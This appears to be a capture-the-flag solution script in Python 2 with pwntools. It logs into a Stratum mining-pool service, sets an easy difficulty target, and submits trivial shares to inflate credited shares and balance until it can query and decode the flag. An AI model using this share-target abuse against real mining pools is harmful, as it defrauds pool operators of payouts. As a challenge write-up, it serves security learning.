#!/usr/bin/env python2

from pwn import *
import sys

from stratum import Stratum, FINAL_DIFF

def main():

    host = sys.argv[1]
    port = int(sys.argv[2])

    conn = remote(host, port)

    s = Stratum(conn)
    s.login()
    s.set_target(['f' + '0' * 0x3f])
    for i in xrange(100):
        s.submit('%08x' % i)
        if i % 10 == 0 and s.get_share() + s.get_balance() > FINAL_DIFF:
            break
    print s.get_share()
    print s.get_balance()
    s.set_target(['2' + '0' * 0x3f])
    while s.get_balance() < FINAL_DIFF or s.get_share() != 0:
        time.sleep(0.1)
    print s.get_share()
    print s.get_balance()
    bits = int(s.query_flag(range(192))[::-1], 2)
    flag = hex(bits)[2:].strip('L').decode('hex')[::-1].encode('hex')

    print "FLAG:", flag

    sys.exit(0)


if __name__ == '__main__':
    main()
    

